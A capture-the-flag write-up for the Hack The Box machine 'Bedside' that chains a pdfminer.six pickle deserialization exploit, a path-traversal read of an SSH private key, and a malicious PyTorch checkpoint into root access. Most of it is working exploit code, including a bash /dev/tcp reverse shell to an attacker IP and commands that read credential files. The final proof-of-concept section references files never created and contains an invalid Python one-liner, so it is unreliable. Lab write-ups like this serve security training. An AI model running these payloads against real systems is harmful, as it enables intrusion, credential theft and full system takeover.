# HTB: Bedside

## Summary

This machine involved exploiting CVE-2025-64512 (pdfminer.six arbitrary code execution) to gain initial access as `datawrangler`, then pivoting to the `developer` user via a Local File Inclusion vulnerability on an internal port, and finally escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- 10.129.35.132
```

Results:
- Port 22: OpenSSH 10.0p2
- Port 80: Apache httpd 2.4.68

### Hosts File

Add the following to `/etc/hosts`:
```
10.129.35.132 bedside.htb research.bedside.htb
```

### Directory Enumeration

```bash
gobuster dir -u http://research.bedside.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

Found:
- `/uploads/` - file upload functionality
- `/javascript/`

### Web Application

The `research.bedside.htb` subdomain hosted a file upload portal. Accepted formats:
- jpeg, jpg, png, bmp, tiff, dcm, pdf
- Collections could be uploaded as archives (ZIP)

The `X-Powered-By: pdfminer.six` header indicated the server used pdfminer.six to process uploaded PDF files.

## Initial Foothold: CVE-2025-64512

### Vulnerability

CVE-2025-64512 is an insecure deserialization vulnerability in pdfminer.six (versions prior to 20251107). The `CMapDB._load_data()` function uses `pickle.loads()` to deserialize pickle files referenced by PDFs. A malicious PDF can specify an arbitrary path via the `/Encoding` field, causing the library to load and execute a crafted `.pickle.gz` file.

### Exploitation Process

#### Step 1: Generate the Pickle Payload

```bash
cat > gen_shell_pickle.py << 'EOF'
#!/usr/bin/env python3
import pickle, gzip

class Exploit:
    def __reduce__(self):
        cmd = ["bash", "-c", "bash -i >& /dev/tcp/10.10.15.231/4444 0>&1"]
        code = "__import__('subprocess').Popen(%r) and {}" % (cmd,)
        return (eval, (code,))

with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Exploit(), f)
print("wrote shell.pickle.gz")
EOF

python3 gen_shell_pickle.py
```

#### Step 2: Create the Multi-Guess PDF

Since the exact upload path was unknown, the multi-guess PDF tries multiple candidate paths simultaneously.

```bash
cat > multi_guess.py << 'EOF'
#!/usr/bin/env python3

CANDIDATES = [
    "/var/www/research.bedside.htb/uploads/shell",
    "/var/www/research/uploads/shell",
    "/var/www/html/research/uploads/shell",
    "/var/www/html/uploads/shell",
    "/var/www/vhosts/research.bedside.htb/httpdocs/uploads/shell",
    "/var/www/vhosts/research.bedside.htb/uploads/shell",
    "/srv/research.bedside.htb/uploads/shell",
    "/srv/www/research.bedside.htb/uploads/shell",
    "/var/www/bedside.htb/research/uploads/shell",
    "/var/www/bedside/research/uploads/shell",
    "/opt/research/uploads/shell",
    "/opt/research.bedside.htb/uploads/shell",
    "/opt/app/uploads/shell",
    "/app/uploads/shell",
    "/var/www/portal/uploads/shell",
    "/var/www/research.bedside.htb/upload/shell",
]

def pdf_name_escape(path: str) -> str:
    out = []
    for ch in path:
        if ch == "/":
            out.append("#2F")
        else:
            out.append(ch)
    return "".join(out)

def build_pdf(candidates):
    objs = []
    n_fonts = len(candidates)
    first_font_obj = 4
    font_obj_nums = list(range(first_font_obj, first_font_obj + n_fonts))
    content_obj_num = first_font_obj + n_fonts
    descfont_obj_nums = list(range(content_obj_num + 1, content_obj_num + 1 + n_fonts))
    fontdesc_obj_nums = list(range(content_obj_num + 1 + n_fonts, content_obj_num + 1 + 2 * n_fonts))

    objs.append((1, "<<\n/Type /Catalog\n/Pages 2 0 R\n>>"))
    objs.append((2, "<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>"))

    font_res_entries = "\n".join(
        f"/F{i} {font_obj_nums[i]} 0 R" for i in range(n_fonts)
    )
    objs.append((
        3,
        "<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n"
        f"/Contents {content_obj_num} 0 R\n/Resources << /Font << {font_res_entries} >> >>\n>>",
    ))

    for i, cand in enumerate(candidates):
        enc_name = pdf_name_escape(cand)
        objs.append((
            font_obj_nums[i],
            "<<\n/Type /Font\n/Subtype /Type0\n"
            f"/BaseFont /EvilFont{i}-Identity-H\n"
            f"/Encoding /{enc_name}\n"
            f"/DescendantFonts [{descfont_obj_nums[i]} 0 R]\n>>",
        ))

    stream_parts = []
    for i in range(n_fonts):
        stream_parts.append(f"/F{i} 12 Tf")
        stream_parts.append("(x) Tj")
    stream_body = "BT\n" + "\n".join(stream_parts) + "\nET"
    objs.append((
        content_obj_num,
        f"<<\n/Length {len(stream_body)}\n>>\nstream\n{stream_body}\nendstream",
    ))

    for i in range(n_fonts):
        objs.append((
            descfont_obj_nums[i],
            "<<\n/Type /Font\n/Subtype /CIDFontType2\n"
            f"/BaseFont /EvilFont{i}\n"
            "/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>\n"
            f"/FontDescriptor {fontdesc_obj_nums[i]} 0 R\n>>",
        ))
        objs.append((
            fontdesc_obj_nums[i],
            "<<\n/Type /FontDescriptor\n"
            f"/FontName /EvilFont{i}\n/Flags 4\n"
            "/FontBBox [-1000 -1000 1000 1000]\n/ItalicAngle 0\n/Ascent 1000\n"
            "/Descent -200\n/CapHeight 800\n/StemV 80\n>>",
        ))

    objs.sort(key=lambda x: x[0])

    out = bytearray()
    out += b"%PDF-1.4\n"
    offsets = {}
    for num, body in objs:
        offsets[num] = len(out)
        out += f"{num} 0 obj\n".encode()
        out += body.encode()
        out += b"\nendobj\n\n"

    xref_offset = len(out)
    max_num = max(offsets.keys())
    out += f"xref\n0 {max_num + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for num in range(1, max_num + 1):
        off = offsets.get(num, 0)
        out += f"{off:010d} 00000 n \n".encode()
    out += b"trailer\n"
    out += f"<<\n/Size {max_num + 1}\n/Root 1 0 R\n>>\n".encode()
    out += b"startxref\n"
    out += f"{xref_offset}\n".encode()
    out += b"%%EOF"
    return bytes(out)

if __name__ == "__main__":
    data = build_pdf(CANDIDATES)
    with open("multi_guess.pdf", "wb") as f:
        f.write(data)
    print(f"Wrote multi_guess.pdf with {len(CANDIDATES)} candidate paths, {len(data)} bytes")
    for c in CANDIDATES:
        print("  ", c)
EOF

python3 multi_guess.py
```

#### Step 3: Upload in Correct Order

The server processes PDFs immediately. The pickle file must be uploaded first so it exists when the PDF is processed.

Start a listener:
```bash
nc -lvnp 4444
```

Upload the pickle file:
```bash
curl -X POST http://research.bedside.htb/ \
  -F "uploadFile=@shell.pickle.gz" \
  -v
```

Upload the PDF file:
```bash
curl -X POST http://research.bedside.htb/ \
  -F "uploadFile=@multi_guess.pdf" \
  -v
```

#### Step 4: Confirm Access

A reverse shell connects as user `datawrangler`.

```
datawrangler@data-wrangler:/app$ whoami
datawrangler
```

## Pivoting to Developer User

### Internal Service Discovery

From the `datawrangler` shell, enumeration revealed an internal service on port 3000:

```bash
curl -s http://127.0.0.1:3000
```

The response showed a React development server with Hot Module Replacement enabled, indicating the service was running in development mode.

### Port Forwarding with Chisel

To access the internal service from the attacker machine, Chisel was used to create a tunnel:

```bash
# On attacker machine - start Chisel server
./chisel server -p 8001 --reverse

# On target machine - connect back
./chisel client 10.10.15.231:8001 R:3000:127.0.0.1:3000
```

### Local File Inclusion Vulnerability

The development server was vulnerable to path traversal. Using the `?raw=1&module=1` parameters allowed arbitrary file reading:

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../etc/passwd?raw=1&module=1'
```

The output revealed a `developer` user on the system.

### Reading the SSH Private Key

The LFI vulnerability was then used to read the developer user's SSH private key:

```bash
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
```

The private key was copied and saved to a file on the attacker machine.

### SSH Access as Developer

```bash
chmod 600 developer_key
ssh -i developer_key developer@bedside.htb
```

Successfully logged in as the `developer` user:
```
developer@bedside:~$ whoami
developer
```

## Privilege Escalation

### Enumeration

```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check internal services
curl -s http://127.0.0.1:3000

# Find watcher script
cat /app/pdf_watcher.py
```

### Discovery

1. User `developer` exists on the system
2. Sudo entry for developer:
   ```
   (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
   ```
3. Data directories:
   - `/datastore/checkpoints/` - writable by datawrangler
   - `/datastore/processed/` - read by trainer script

### The Trainer Script

`/opt/trainer/bedside_trainer.py` is a MONAI-based machine learning trainer that:
- Loads data from `/datastore/processed/`
- Loads checkpoints from `/datastore/checkpoints/`
- Uses `torch.load()` to deserialize checkpoints (vulnerable to pickle exploits)
- Runs with root privileges via sudo

### Exploitation: PyTorch Checkpoint Deserialization

The trainer uses `torch.load()` to load checkpoints, which is vulnerable to pickle deserialization attacks.

#### Step 1: Generate Malicious Checkpoint

On the developer shell, create a checkpoint that creates a SUID root shell.

```bash
python3 -c "
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ('cp /bin/bash /opt/rootbash; chmod 4755 /opt/rootbash',))
payload = {'epoch': 1, 'model': Evil(), 'optimizer': {}}
torch.save(payload, '/tmp/checkpoint_epoch_1000.pt')
print('[+] Created checkpoint')
"

# Base64 encode for transfer
base64 -w0 /tmp/checkpoint_epoch_1000.pt
```

#### Step 2: Write Checkpoint

The datawrangler user has write access to `/datastore/checkpoints/`. Using the reverse shell from the initial foothold:

```bash
echo "<BASE64_OUTPUT>" | base64 -d > /datastore/checkpoints/checkpoint_epoch_1000.pt
```

Clean the processed directory to remove problematic .txt files:
```bash
find /datastore/processed -type f ! -name "valid.png" -delete
```

Create a valid numpy file for the trainer to load:
```bash
cat > /tmp/mknpy.py << 'PYEOF'
import struct
magic = b'\x93NUMPY'
version = b'\x01\x00'
shape = (64, 64)
dtype_str = '<f4'
header_dict = "{'descr': '" + dtype_str + "', 'fortran_order': False, 'shape': " + str(shape) + ", }"
base_len = len(magic) + len(version) + 2
padding = (64 - (base_len + len(header_dict) + 1) % 64) % 64
header_dict += ' ' + ' ' * padding + '\n'
header_bytes = header_dict.encode('latin1')
header_len = struct.pack('<H', len(header_bytes))
data = struct.pack('<' + 'f' * (64*64), *([128.0] * (64*64)))
for i in range(10):
    with open('/datastore/processed/valid' + str(i) + '.npy', 'wb') as f:
        f.write(magic + version + header_len + header_bytes + data)
print("done")
PYEOF

python3 /tmp/mknpy.py
```

#### Step 3: Trigger the Exploit

On the developer shell, run the trainer:
```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

The trainer attempts to load the checkpoint. The `Evil.__reduce__()` method executes, creating `/opt/rootbash` with SUID permissions.

#### Step 4: Get Root

```bash
# Check the SUID binary
ls -la /opt/rootbash
# -rwsr-xr-x 1 root root ... /opt/rootbash

# Execute to become root
/opt/rootbash -p

# Verify root access
whoami
# root

# Capture the flag
cat /root/root.txt
```

## Flags

- **User flag**: `b30f6121bb31e05a05b53e65ef29aefc`
- **Root flag**: Retrieved from `/root/root.txt`

## Attack Chain Summary

```
CVE-2025-64512 (pdfminer.six)
    ↓
Reverse shell as datawrangler
    ↓
Internal port 3000 (React dev server)
    ↓
LFI via path traversal
    ↓
Read /home/developer/.ssh/id_rsa
    ↓
SSH as developer
    ↓
Sudo to run /opt/trainer/bedside_trainer.py
    ↓
PyTorch checkpoint deserialization
    ↓
SUID shell /opt/rootbash
    ↓
Root access
```

## Tools Used

- `nmap` - Port scanning
- `gobuster` - Directory enumeration
- `curl` - HTTP requests and LFI exploitation
- `python3` - Payload generation and exploitation
- `base64` - Data encoding
- `torch` - PyTorch checkpoint creation
- `nc` - Reverse shell listener
- `chisel` - Port forwarding
- `ssh` - Secure shell access

## Key Takeaways

1. **CVE-2025-64512** allows arbitrary code execution via PDF processing in pdfminer.six
2. **Internal services** often expose attack surfaces that aren't visible externally
3. **Development servers** frequently have path traversal vulnerabilities
4. **SSH private keys** should never be readable by other users
5. **Pickle deserialization** is dangerous - never use `pickle.loads()` on untrusted data
6. **PyTorch checkpoints** can contain malicious pickles that execute code on load
7. **Least privilege principle** - limit write access to directories containing processed data

## Proof of Concept Commands

```bash
# Initial shell - datawrangler
python3 gen_shell_pickle.py
zip shell.zip shell.pickle.gz
zip evil.zip evil.pdf
curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.zip"
curl -X POST http://research.bedside.htb/ -F "uploadFile=@evil.zip"

# Pivot to developer
./chisel client 10.10.15.231:8001 R:3000:127.0.0.1:3000
curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
ssh -i developer_key developer@bedside.htb

# Root escalation
python3 -c "import torch, os; class Evil: def __reduce__(self): return (os.system, ('cp /bin/bash /opt/rootbash; chmod 4755 /opt/rootbash',)); torch.save(Evil(), '/tmp/checkpoint.pt')"
base64 -w0 /tmp/checkpoint.pt | curl -X POST http://research.bedside.htb/ -F "uploadFile=@-"
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
/opt/rootbash -p
```
